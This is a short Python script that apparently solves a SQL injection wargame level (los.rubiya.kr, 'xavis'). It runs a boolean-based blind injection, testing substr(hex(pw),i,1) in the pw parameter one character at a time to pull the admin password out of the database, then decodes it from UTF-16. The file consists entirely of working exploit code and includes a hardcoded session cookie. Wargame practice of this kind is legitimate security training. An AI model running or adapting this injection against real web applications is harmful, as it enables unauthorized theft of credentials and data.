import requests
import string

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")

pw = ""
for i in range(1,25):
    for j in string.hexdigits:
        payload = f"1' or id='admin' and substr(hex(pw),{i},1) = '{j}' -- "
        response = requests.get(url, cookies=cookie, params={"pw":payload})
        if "Hello admin" in response.text:
            print(j)
            pw += j
            break
    else :
        print("fin")
        break

pw = bytes.fromhex(pw.replace('0000','')).decode('utf-16-be')
print(pw)